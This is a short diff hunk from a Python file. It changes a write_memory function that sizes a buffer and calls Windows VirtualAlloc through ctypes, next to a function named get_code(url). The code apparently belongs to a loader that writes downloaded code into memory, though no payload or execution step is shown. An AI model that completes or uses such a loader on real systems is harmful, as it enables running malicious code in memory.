@@ -26,7 +26,7 @@ def get_code(url):
 
 def write_memory(buf):
     length = len(buf)
-    length = ctypes.c_size_t(length + (128 * 1024))
+    length = ctypes.c_size_t(length)
 
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     #* https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
